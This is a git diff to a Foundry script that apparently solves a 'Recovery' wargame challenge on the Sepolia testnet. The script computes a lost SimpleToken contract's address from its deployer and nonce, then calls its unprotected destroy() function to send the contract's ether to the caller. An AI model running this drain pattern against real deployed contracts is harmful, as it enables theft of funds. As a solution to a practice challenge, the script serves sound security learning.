@@ -11,7 +11,11 @@ contract RecoveryAttack is Script {
     function run() public {
         vm.startBroadcast(); // Starts broadcasting transactions
         // https://sepolia.etherscan.io/address/0xd159467ead97F73E7BB0C0417D7388c0AAe39f6D#internaltx
-        simpleToken = SimpleToken(payable(0xa1Fbcc2F3e95473A488983f38206ADfa04dd2422));
+        // or calculate the address of the contract deployed by the challenge contract
+        address simpleTokenAddress =
+            address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), CHALLENGE, bytes1(0x01))))));
+        console.log("SimpleToken deployed at:", simpleTokenAddress);
+        simpleToken = SimpleToken(payable(simpleTokenAddress));
         simpleToken.destroy(payable(msg.sender));
         vm.stopBroadcast();
     }
